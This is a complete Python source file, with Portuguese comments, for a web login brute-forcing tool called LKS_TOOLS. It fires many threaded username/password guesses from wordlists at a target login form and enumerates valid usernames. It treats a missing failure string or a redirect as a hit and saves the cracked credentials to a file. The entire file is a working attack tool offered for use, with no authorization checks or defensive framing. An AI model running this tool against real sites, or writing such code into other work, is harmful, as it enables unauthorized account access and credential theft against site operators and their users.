#!/usr/bin/env python3
# lks_brute_v8.5.py
# LKS_TOOLS - A pré-validação agora usa o usuário alvo quando fornecido.

import os
import sys
import re
import csv
import time
import argparse
import random
import threading
from datetime import datetime, timezone
from zoneinfo import ZoneInfo
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional # Importado para type hinting

import requests
from requests import Session

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel

# --- Configurações Globais ---
PERFORMANCE_LOG_ENABLED = True
CSV_LOG_FILE = "performance_log.csv"
HUMAN_LOG_FILE = "session_report.log"
SCRIPT_VERSION = "v8.5" # Versão atualizada

# --- Constantes Globais ---
MAX_WORKERS_CAP = 64
DEFAULT_WORKERS = 16
REQUEST_TIMEOUT = 10
DEFAULT_DUMMY_PASSWORD = "LKSFerreira@42"

PREFLIGHT_USER_BASE = "lks_preflight"
PREFLIGHT_PASS_BASE = "LksPreflightPass@"

console = Console()

BANNER = rf"""
 __         __  __     ______        ______   ______     ______     __         ______
/\ \       /\ \/ /    /\  ___\      /\__  _\ /\  __ \   /\  __ \   /\ \       /\  ___\
\ \ \____  \ \  _"-.  \ \___  \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  \ \___  \
 \ \_____\  \ \_\ \_\  \/\_____\       \ \_\  \ \_____\  \ \_____\  \ \_____\  \/\_____\
  \/_____/   \/_/\/_/   \/_____/        \/_/   \/_____/   \/_____/   \/_____/   \/_____/

      LKS_TOOLS Bruteforce {SCRIPT_VERSION} (Targeted Pre-flight)
"""

# --- Funções Auxiliares e de Validação (Sem alterações) ---
def format_duration(total_seconds: float) -> str:
    total_seconds = int(total_seconds)
    hours, remainder = divmod(total_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def url_validator(url: str) -> str:
    if not re.match(r'^https?://.+$', url):
        raise argparse.ArgumentTypeError(f"URL inválida: '{url}'. Deve começar com 'http://' ou 'https://'.")
    return url

def wordlist_validator(path: str) -> str:
    if not path.lower().endswith('.txt'):
        raise argparse.ArgumentTypeError(f"Arquivo de wordlist deve ser .txt: '{path}'")
    if not os.path.isfile(path):
        raise argparse.ArgumentTypeError(f"Arquivo de wordlist não encontrado: '{path}'")
    return path

def text_input_validator(value: str) -> str:
    if not value or not value.strip():
        raise argparse.ArgumentTypeError("O valor não pode ser uma string vazia.")
    return value

def workers_validator(value: str) -> int:
    try:
        ivalue = int(value)
        if not (1 <= ivalue <= MAX_WORKERS_CAP):
            raise argparse.ArgumentTypeError(f"O número de workers deve estar entre 1 e {MAX_WORKERS_CAP}.")
        return ivalue
    except ValueError:
        raise argparse.ArgumentTypeError("O número de workers deve ser um inteiro válido.")

# --- Funções de Lógica e Logging ---
def read_wordlist(path: str) -> list[str]:
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(f"[bold red]Erro crítico ao ler o arquivo {path}:[/] {e}")
        sys.exit(1)

def log_performance_data_csv(version, url, mode, workers, attempts, successes, duration):
    file_exists = os.path.isfile(CSV_LOG_FILE)
    header = ["version", "timestamp_utc", "target_url", "mode", "workers", "total_attempts", "successes", "total_duration_sec"]
    data_row = [version, datetime.now(timezone.utc).isoformat(), url, mode, workers, attempts, successes, f"{duration:.4f}"]
    try:
        with open(CSV_LOG_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(header)
            writer.writerow(data_row)
    except IOError as e:
        console.print(f"[bold red]Erro ao escrever no arquivo de log CSV:[/] {e}")

def log_human_readable_report(version, url, mode, workers, attempts, successes, duration):
    try:
        sao_paulo_tz = ZoneInfo("America/Sao_Paulo")
        timestamp_brt = datetime.now(timezone.utc).astimezone(sao_paulo_tz)
        formatted_time = timestamp_brt.strftime('%Y-%m-%d %H:%M:%S %Z')
        formatted_duration = format_duration(duration)
        log_entry = (f"[VERSÃO: {version}] - [TIME: {formatted_time}] - [URL: {url}] - [MODO: {mode.replace('_', '-')}] - "
                     f"[WORKERS: {workers}] - [TENTATIVAS: {attempts}] - [SUCESSO: {successes}] - [DURAÇÃO: {formatted_duration}]\n")
        with open(HUMAN_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except (IOError, ZoneInfo.tzname) as e:
        console.print(f"[bold red]Erro ao escrever no arquivo de log legível:[/] {e}")

# --- LÓGICA PRINCIPAL MODIFICADA ---

def validate_failure_condition(
    session: Session, url: str, failure_pattern: re.Pattern, preflight_user: Optional[str] = None
) -> bool:
    """
    Valida a condição de falha. Se um usuário específico (preflight_user) for
    fornecido, ele será usado no teste. Caso contrário, um usuário aleatório é gerado.
    """
    console.print("[cyan]Iniciando pré-validação da condição de falha...[/]", style="italic")
    
    random_suffix = f"{random.randint(100, 999)}"
    # A senha é sempre aleatória e provavelmente incorreta.
    test_pass = f"{PREFLIGHT_PASS_BASE}{random_suffix}"

    if preflight_user:
        # Se um usuário alvo foi especificado (modo bruteforce -u), use-o.
        test_user = preflight_user
        console.print(f"[dim]  -> Testando com usuário alvo: '{test_user}' e senha aleatória.[/dim]")
    else:
        # Caso contrário (modo enumeração -U), use um usuário aleatório.
        test_user = f"{PREFLIGHT_USER_BASE}_{random_suffix}"
        console.print(f"[dim]  -> Testando com usuário aleatório: '{test_user}' e senha aleatória.[/dim]")

    data = {"username": test_user, "password": test_pass}

    try:
        r = session.post(url, data=data, timeout=REQUEST_TIMEOUT)
        if re.search(failure_pattern, r.text):
            console.print("[bold green]  [✔] Sucesso! A condição de falha foi validada.[/]\n")
            return True
        else:
            console.print("[bold red]  [✖] FALHA NA VALIDAÇÃO![/]")
            console.print(f"[yellow]  A string de falha esperada ('{failure_pattern.pattern}') não foi encontrada na resposta.[/]")
            return False
    except requests.RequestException as e:
        console.print(f"[bold red]Erro de rede durante a pré-validação:[/] {e}")
        return False

def test_credential(session: Session, url: str, user: str, password: str, failure_pattern: re.Pattern) -> tuple[str, str, bool]:
    data = {"username": user, "password": password}
    try:
        r = session.post(url, data=data, allow_redirects=False, timeout=REQUEST_TIMEOUT)
        if r.status_code in (301, 302, 303, 307, 308) and "Location" in r.headers:
            return user, password, True
        if re.search(failure_pattern, r.text):
            return user, password, False
        return user, password, True
    except requests.RequestException:
        return user, password, False

def run_attack_and_log_results(
    session: Session, url: str, users: list[str], passwords: list[str],
    failure_pattern: re.Pattern, workers: int, mode: str, output_file_handle
) -> int:
    total_attempts = len(users) * len(passwords)
    found_items = []
    file_lock = threading.Lock()

    progress_desc = "Enumerando... [Encontrados: {count}]" if mode == "USER_ENUM" else "Testando... [Encontrados: {count}]"

    console.print(f"[bold cyan]Modo: {mode.replace('_', ' ')}[/]")
    console.print(f"[cyan]Iniciando com {workers} workers para {total_attempts} tentativas.")
    console.print(f"[cyan]Definição de FALHA:[/] Resposta contém [yellow]'{failure_pattern.pattern}'[/] (case-insensitive).")

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task(progress_desc.format(count=0), total=total_attempts)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(test_credential, session, url, u, p, failure_pattern) for u in users for p in passwords]
            for future in as_completed(futures):
                user, password, is_valid = future.result()
                if is_valid:
                    item = user if mode == "USER_ENUM" else f"{user}:{password}"
                    found_items.append(item)
                    with file_lock:
                        console.print(f"[green]SUCESSO:[/] {item}")
                        output_file_handle.write(f"{item}\n")
                        output_file_handle.flush()
                progress.update(task, advance=1, description=progress_desc.format(count=len(found_items)))
    return len(found_items)

def main():
    start_time = time.perf_counter()
    epilog_text = f"""
Filosofia de Uso:
  Esta ferramenta opera com um princípio simples: SUCESSO é a ausência da string de falha.
  Você DEVE informar à ferramenta o que constitui uma falha usando o parâmetro -f.

Exemplos Práticos:
  1. Enumeração de Usuários: {sys.argv[0]} https://alvo.com/login -f "Invalid username" -U u.txt
  2. Bruteforce de Senha: {sys.argv[0]} https://alvo.com/login -f "Invalid password" -u admin -P p.txt
"""
    parser = argparse.ArgumentParser(description=f"LKS_TOOLS {SCRIPT_VERSION} - Ferramenta de bruteforce.", formatter_class=argparse.RawTextHelpFormatter, epilog=epilog_text)
    parser.add_argument("url", type=url_validator, help="URL do formulário de login.")
    parser.add_argument("-f", "--failure-string", type=text_input_validator, required=True, help="String que indica uma tentativa FALHA.")
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-U", "--user-list", type=wordlist_validator, help="Wordlist de usuários (.txt).")
    user_group.add_argument("-u", "--user", type=text_input_validator, help="Um único nome de usuário.")
    pass_group = parser.add_mutually_exclusive_group()
    pass_group.add_argument("-P", "--pass-list", type=wordlist_validator, help="Wordlist de senhas (.txt).")
    pass_group.add_argument("-p", "--password", type=text_input_validator, help="Uma única senha.")
    parser.add_argument("-w", "--workers", type=workers_validator, default=DEFAULT_WORKERS, help=f"Número de threads (padrão: {DEFAULT_WORKERS}, max: {MAX_WORKERS_CAP}).")
    args = parser.parse_args()

    console.print(Panel(BANNER, title="LKS_TOOLS", subtitle="🔥 by LKS Ferreira", expand=False, border_style="bold magenta"))
    failure_pattern = re.compile(re.escape(args.failure_string), re.IGNORECASE)

    users = read_wordlist(args.user_list) if args.user_list else [args.user]
    if not users:
        console.print(f"[bold red]ERRO: A lista de usuários '{args.user_list}' está vazia.[/]")
        return 1

    passwords, mode = ([DEFAULT_DUMMY_PASSWORD], "USER_ENUM")
    if args.pass_list or args.password:
        mode = "BRUTEFORCE"
        passwords = read_wordlist(args.pass_list) if args.pass_list else [args.password]
        if not passwords and args.pass_list:
            console.print(f"[bold red]ERRO: A lista de senhas '{args.pass_list}' está vazia.[/]")
            return 1

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file_base = "valid_usernames" if mode == "USER_ENUM" else "valid_credentials"
    output_file = f"{output_file_base}_{ts}.txt"

    with requests.Session() as session:
        try:
            head = session.get(args.url, timeout=REQUEST_TIMEOUT)
            if head.status_code >= 400:
                console.print(f"[bold red]Erro: URL retornou status inalcançável {head.status_code}[/]")
                return 1
            console.print(f"[green]Conexão com {args.url} estabelecida (Status: {head.status_code}).[/]\n")
        except requests.RequestException as e:
            console.print(f"[bold red]Erro fatal ao acessar a URL:[/] {e}")
            return 1

        # --- LÓGICA DE CHAMADA MODIFICADA ---
        # Define qual usuário será usado para a pré-validação.
        preflight_user_for_validation = None
        # A condição é: estamos no modo de força bruta E um usuário único foi fornecido.
        if mode == "BRUTEFORCE" and args.user:
            preflight_user_for_validation = args.user

        # Passa o usuário para a função de validação. Será None se não for o caso acima.
        if not validate_failure_condition(session, args.url, failure_pattern, preflight_user=preflight_user_for_validation):
            return 1

        found_count = 0
        with open(output_file, 'w', encoding='utf-8') as f:
            found_count = run_attack_and_log_results(
                session, args.url, users, passwords, failure_pattern, args.workers, mode, f
            )

    total_attempts = len(users) * len(passwords)
    
    if found_count == 0:
        os.remove(output_file)
        final_output_file = "N/A"
    else:
        final_output_file = output_file

    table = Table(title="Resumo da Operação")
    table.add_column("Modo", style="cyan"); table.add_column("Tentativas", style="magenta")
    table.add_column("Encontrados", style="green"); table.add_column("Arquivo de Saída", style="yellow")
    table.add_row(mode.replace("_", " "), str(total_attempts), str(found_count), final_output_file)
    console.print(table)

    if found_count > 0:
        console.print(f"\n[bold green]Operação concluída![/] {found_count} itens salvos em [yellow]{final_output_file}[/]")
    else:
        console.print("\n[bold yellow]Operação concluída. Nenhum item válido foi encontrado.[/]")

    end_time = time.perf_counter()
    total_duration = end_time - start_time

    if PERFORMANCE_LOG_ENABLED:
        log_performance_data_csv(SCRIPT_VERSION, args.url, mode, args.workers, total_attempts, found_count, total_duration)
        log_human_readable_report(SCRIPT_VERSION, args.url, mode, args.workers, total_attempts, found_count, total_duration)
        console.print(f"[dim]Relatórios de performance salvos em [bold cyan]{CSV_LOG_FILE}[/bold cyan] e [bold cyan]{HUMAN_LOG_FILE}[/bold cyan].[/dim]")
    
    return 0

def run_script():
    exit_code = 0
    try:
        exit_code = main()
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]Operação interrompida pelo usuário. Saindo.[/]")
        exit_code = 130
    except argparse.ArgumentError as e:
        console.print(f"\n[bold red]Erro de Argumento:[/] {e}")
        exit_code = 2
    except Exception as e:
        console.print(f"\n[bold red]Ocorreu um erro inesperado:[/] {e}")
        exit_code = 1
    finally:
        console.print("\n[bold yellow]Pressione ENTER para fechar...[/]")
        input()
        sys.exit(exit_code)

if __name__ == "__main__":
    run_script()
    input("Pressione ENTER para fechar a janela...")